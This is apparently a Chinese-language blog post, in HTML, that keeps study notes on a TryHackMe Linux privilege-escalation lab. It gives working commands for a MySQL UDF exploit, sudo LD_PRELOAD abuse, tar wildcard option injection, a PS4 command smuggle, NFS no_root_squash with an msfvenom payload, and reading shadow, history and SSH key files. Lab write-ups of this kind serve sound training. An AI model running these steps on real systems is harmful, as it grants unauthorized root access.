@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<meta name="google-site-verification" content="LZ0JOjQQZw7PhvjIbZqeOojf3J6807W7DPn6--OTptc" />
+<meta name="baidu-site-verification" content="code-DDmcbQ6zQN" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <meta name="google-site-verification" content="true">
+  <meta name="msvalidate.01" content="true">
+  <meta name="yandex-verification" content="true">
+  <meta name="baidu-site-verification" content="true">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"noone40404.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="系统学下linux提权基础">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM学习日寄26-Linux PrivEsc">
+<meta property="og:url" content="http://noone40404.github.io/2024/11/20/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8426%EF%BC%9ALinuxPrivEsc/index.html">
+<meta property="og:site_name" content="noone___&#39;s blog">
+<meta property="og:description" content="系统学下linux提权基础">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d4ae7d29ded1a8c7cdabd.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d4bf1d29ded1a8c7da6df.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d4e4fd29ded1a8c7f484b.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d4f28d29ded1a8c7fdd6e.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d5085d29ded1a8c80b44f.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d5131d29ded1a8c816d49.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d51afd29ded1a8c81bc81.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d5340d29ded1a8c82d128.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d53b4d29ded1a8c834ad8.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d543cd29ded1a8c83abb4.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d546fd29ded1a8c83cfbd.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d54a5d29ded1a8c83f4ce.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673d5697d29ded1a8c855fda.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673dea1ed29ded1a8c126004.png">
+<meta property="article:published_time" content="2024-11-20T13:26:00.000Z">
+<meta property="article:modified_time" content="2024-11-30T11:53:58.575Z">
+<meta property="article:author" content="noone___">
+<meta property="article:tag" content="THM">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/673d4ae7d29ded1a8c7cdabd.png">
+
+<link rel="canonical" href="http://noone40404.github.io/2024/11/20/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8426%EF%BC%9ALinuxPrivEsc/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>THM学习日寄26-Linux PrivEsc | noone___'s blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="noone___'s blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">noone___'s blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/noone40404" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2024/11/20/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8426%EF%BC%9ALinuxPrivEsc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          THM学习日寄26-Linux PrivEsc
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-11-20 21:26:00" itemprop="dateCreated datePublished" datetime="2024-11-20T21:26:00+08:00">2024-11-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-30 19:53:58" itemprop="dateModified" datetime="2024-11-30T19:53:58+08:00">2024-11-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">系统学下linux提权基础</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><p>服务漏洞利用</p>
+<p>  <code>MySQL</code> 正在以 <code>root</code> 身份运行，且服务的 <code>root</code> 用户未设置密码，即可以以 <code>root</code> 用户无密码连接到 <code>MySQL</code> 服务</p>
+<p>  可以利用用户定义函数 <code>UDF</code> 通过 <code>MySQL</code> 来以 <code>root</code> 运行命令，<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">见这里</a></p>
+<p>  切换到 <code>/home/user/tools/mysql-udf</code></p>
+<p>  下载下来 <code>1518.c</code> ，并编译：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c -fPIC</span><br><span class="line">gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673d4ae7d29ded1a8c7cdabd.png" alt=""></p>
+<p>  随后连接到 <code>MySQL</code> ，创建一个 <code>do_system</code> 的用户定义函数UDF，来使用 <code>poc</code> ：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br><span class="line">use mysql;</span><br><span class="line">create table noone(line blob);</span><br><span class="line">insert into noone values(load_file(&#x27;/home/user/tools/mysql-udf/1518.so&#x27;));</span><br><span class="line">select * from noone into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br></pre></td></tr></table></figure>
+<p>  随后使用该函数将 <code>/bin/bash</code> 复制一份到 <code>/tmp/rootbash</code> ，并设置 <code>SUID</code> 权限</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;);</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673d4bf1d29ded1a8c7da6df.png" alt=""></p>
+</li>
+<li><p>弱文件权限-可读的 <code>/etc/shadow</code></p>
+<p>  直接爆 <code>root</code> 的 <code>hash</code> 就行</p>
+</li>
+<li><p>弱文件权限-可写的 <code>/etc/shadow</code></p>
+<p>  创建一个自定义密码并 <code>hash</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkpasswd -m sha-512 [新密码]</span><br></pre></td></tr></table></figure>
+<p>  然后将 <code>root</code> 的原密码哈希替换为新的</p>
+</li>
+<li><p>弱文件权限-可写的 <code>/etc/passwd</code></p>
+<p>  仍是生成一个新密码的 <code>hash</code> ，并用其替换 <code>root</code> 用户行的 <code>x</code></p>
+</li>
+<li><p><code>sudo</code> - <code>shell</code> 逃逸序列</p>
+<p>  就是 <code>sudo -l</code> ，再去<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> 找显示有 <code>sudo</code> 功能的</p>
+</li>
+<li><p><code>sudo</code> - 环境变量</p>
+<p>  <code>sudo -l</code> 中查找被继承的环境变量：<code>env_keep</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/673d4e4fd29ded1a8c7f484b.png" alt=""></p>
+<p>  可以看到 <code>LD_PRELOAD</code> 和 <code>LD_LIBRARY_PATH</code> 都是从用户环境中继承，前者在运行程序时在其他所有共享对象之前加载一个共享对象，后者提供了共享库首先搜索的目录列表</p>
+<ul>
+<li><p><code>LD_PRELOAD</code></p>
+<p>  使用在 <code>/home/user/tools/sudo</code> 的 <code>preload.c</code> 创建一个共享对象，将 <code>LD_PRELOAD</code> 环境变量设置为新共享对象的完整路径并运行任意一个可以通过 <code>sudo</code> 运行的程序</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</span><br><span class="line">sudo LD_PRELOAD=/tmp/preload.so [sudo -l 看到的程序任意]</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673d4f28d29ded1a8c7fdd6e.png" alt=""></p>
+</li>
+<li><p><code>LD_LIBRARY_PATH</code></p>
+<p>  再以 <code>/usr/sbin/apache2</code> 为例，运行 <code>ldd</code> 来查看其使用的共享库</p>
+<p>  使用 <code>/home/user/tools/sudo</code> 的 <code>library_path.c</code> 创建一个和其中任意库同名的共享对象，再用 <code>sudo</code> 运行 <code>apache2</code> ，同时将 <code>LD_LIBRARY_PATH</code> 环境变量设置为 <code>/tmp</code> ，即输出的共享对象的位置</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</span><br><span class="line">sudo LD_LIBRARY_PATH=/tmp apache2</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673d5085d29ded1a8c80b44f.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p>定时任务-文件权限</p>
+<p>  就是 <code>cat /etc/crontab</code> 找可更改的任务并替换为反弹 <code>shell</code></p>
+</li>
+<li><p>定时任务-<code>PATH</code> 环境变量</p>
+<p>  <img src="https://pic.imgdb.cn/item/673d5131d29ded1a8c816d49.png" alt=""></p>
+<p>  <code>PATH</code> 变量中有用户主目录，在这里写个 <code>shell</code> 即可</p>
+</li>
+<li><p>定时任务-通配符</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/local/bin/compress.sh</span><br></pre></td></tr></table></figure>
+<p>  注意这个定时任务里面的 <code>*</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/673d51afd29ded1a8c81bc81.png" alt=""></p>
+<p>  <code>tar</code> 命令在用户主目录使用了通配符 <code>*</code> ，而 <code>tar</code> 具有命令行选项。可以作为检查点功能的一部分运行其他命令，即在主目录新建这两个：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch /home/user/--checkpoint=1</span><br><span class="line">touch /home/user/--checkpoint-action=exec=shell.elf</span><br></pre></td></tr></table></figure>
+<p>  <code>tar</code> 命令运行时，通配符会确保扫描到这些文件，而由于其文件名是有效的 <code>tar</code> 命令行选项，其会被视为选项而非文件名</p>
+<p>  那么再传一个 <code>shell.elf</code> 即可</p>
+</li>
+<li><p><code>SUID/SGID</code> 可执行文件-已知漏洞</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>
+<p>  找到所有的 <code>SUID/SGID</code> 可执行文件，然后慢慢找对应版本是否有漏洞</p>
+</li>
+<li><p><code>SUID/SGID</code> 可执行文件-共享对象注入</p>
+<p>  这个我不知道是怎么发现的</p>
+<p>  <code>/usr/local/bin/suid-so</code> 容易受到共享对象注入攻击：运行看到其在退出前显示一个进度条：</p>
+<p>  <img src="https://pic.imgdb.cn/item/673d5340d29ded1a8c82d128.png" alt=""></p>
+<p>  用 <code>strace</code> 来跟踪该文件，并搜索 <code>open/access</code> 调用和 <code>no such file</code> 错误：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</span><br></pre></td></tr></table></figure>
+<p>  看到其试图加载家目录下的一个共享对象但未找到：</p>
+<p>  <img src="https://pic.imgdb.cn/item/673d53b4d29ded1a8c834ad8.png" alt=""></p>
+<p>  那么手动创建一个 <code>.config</code> 目录，并用 <code>/home/user/tools/suid/libcalc.c</code> 生成一个 <code>.so</code> 并放到对应位置，再执行 <code>suid-so</code> 即可</p>
+<p>  <img src="https://pic.imgdb.cn/item/673d543cd29ded1a8c83abb4.png" alt=""></p>
+</li>
+<li><p><code>SUID/SGID</code> 可执行文件-环境变量</p>
+<p>  对于 <code>/usr/local/bin/suid-env</code> 文件，发现其试图启动 <code>apache2</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/673d546fd29ded1a8c83cfbd.png" alt=""></p>
+<p>  <code>strings</code> 看一下字符串</p>
+<p>  <img src="https://pic.imgdb.cn/item/673d54a5d29ded1a8c83f4ce.png" alt=""></p>
+<p>  这里还是不够敏感，从 <code>service apache2 start</code> 应该发现是使用了 <code>service</code> 文件来启动服务器，但是没使用完整路径 <code>/usr/sbin/service</code></p>
+<p>  那么就是新建个叫 <code>service</code> 的 <code>shell</code> ，把其路径加到 <code>PATH</code> 里面即可</p>
+</li>
+<li><p><code>SUID/SGID</code> 可执行文件-滥用 <code>shell</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>
+<p>  唯一的不同是其使用了 <code>service</code> 的完整路径来启动 <code>apache2</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash --version</span><br></pre></td></tr></table></figure>
+<p>  这里有个神奇的 <code>trick</code>：在 <code>bash</code> 版本低于 <code>4.2.048</code> 的情况下，可以令 <code>shell</code> 函数的名称与文件路径相同，再导出该函数，使其替代文件路径下任何实际可执行路径：</p>
+<p>  即定义一个名为 <code>/usr/sbin/service</code> 的 <code>bash</code> 函数，再导出：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function /usr/sbin/service &#123;/bin/bash -p;&#125;</span><br><span class="line">export -f /usr/sbin/service</span><br></pre></td></tr></table></figure>
+<p>  随后运行 <code>suid-env2</code> 即可</p>
+<p>  <img src="https://pic.imgdb.cn/item/673d5697d29ded1a8c855fda.png" alt=""></p>
+</li>
+<li><p><code>SUID/SGID</code> 可执行文件-滥用 <code>shell</code> #2</p>
+<p>  此类方法仅在 <code>bash 4.4</code> （不包括）以下版本生效</p>
+<p>  在调试模式下，<code>bash</code> 使用环境变量 <code>PS4</code> 来显示用于调试语句的额外提示</p>
+<p>  那么在使用 <code>bash</code> 调试的时候将 <code>PS4</code> 变量设置为一个嵌入式命令来将 <code>/bin/bash</code> 复制到 <code>/tmp/rootbash</code> 并加上 <code>SUID</code> 权限：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>
+<p>  再去 <code>/tmp/rootbash</code> 即可</p>
+</li>
+<li><p>密码和密钥-历史文件</p>
+<p>  就是看用户主目录中历史文件，其记录了命令行输入，如果在输用户名的时候输入密码就会被记录在其中</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.*history | less</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>密码和密钥-配置文件</p>
+<p>  就是找明文或可解密格式存密码的配置文件，在这里是：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/user/myvpn.ovpn</span><br></pre></td></tr></table></figure>
+<p>  其指向： <code>/etc/openvpn/auth.txt</code></p>
+<p>  其中找到明文密码</p>
+</li>
+<li><p>密码和密钥- <code>ssh</code> 密钥</p>
+<p>  用户会备份重要文件，但有时未能使用正确权限保护他们</p>
+<p>  <code>ls -la /</code> 看到隐藏目录 <code>.ssh</code></p>
+<p>  找到 <code>root_key</code></p>
+</li>
+<li><p><code>NFS</code></p>
+<p>  使用 <code>NFS</code> 创建的文件会继承远程用户的 <code>id</code> ，并启用了 <code>root</code> 压缩，那么 <code>ID</code> 会被设置为 <code>nobody</code></p>
+<p>  <code>cat /etc/exports</code> 检查虚拟机的 <code>NFS</code> 配置：</p>
+<p>  <img src="https://pic.imgdb.cn/item/673dea1ed29ded1a8c126004.png" alt=""></p>
+<p>  注意到 <code>/tmp</code> 共享禁用了 <code>root</code> 压缩</p>
+<p>  在攻击机上创建挂载点并挂载该 <code>/tmp</code> 共享，再用 <code>msf</code> 生成一个调用 <code>/bin/bash</code> 的 <code>payload</code>，将其保存在挂载的共享的目录下：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/nfs</span><br><span class="line">mount -o rw,vers=3 10.10.108.95:/tmp /tmp/nfs</span><br><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>
+<p>  在受害者上执行 <code>/tmp/shell.elf</code> 即可</p>
+</li>
+<li><p>内核漏洞</p>
+<p>  可以使用 <code>Linux Exploit Suggester 2</code> 来扫描，然后脏牛提权</p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>noone___
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://noone40404.github.io/2024/11/20/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8426%EF%BC%9ALinuxPrivEsc/" title="THM学习日寄26-Linux PrivEsc">http://noone40404.github.io/2024/11/20/THM学习日寄26：LinuxPrivEsc/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/THM/" rel="tag"><i class="fa fa-tag"></i> THM</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/19/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8425%EF%BC%9AEnterprise/" rel="prev" title="THM打靶日寄25-Enterprise">
+      <i class="fa fa-chevron-left"></i> THM打靶日寄25-Enterprise
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/11/21/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8427%EF%BC%9AJurassic%20Park/" rel="next" title="THM打靶日寄27-Jurassic Park">
+      THM打靶日寄27-Jurassic Park <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="noone___"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">noone___</p>
+  <div class="site-description" itemprop="description">自闭中</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">151</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">78</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
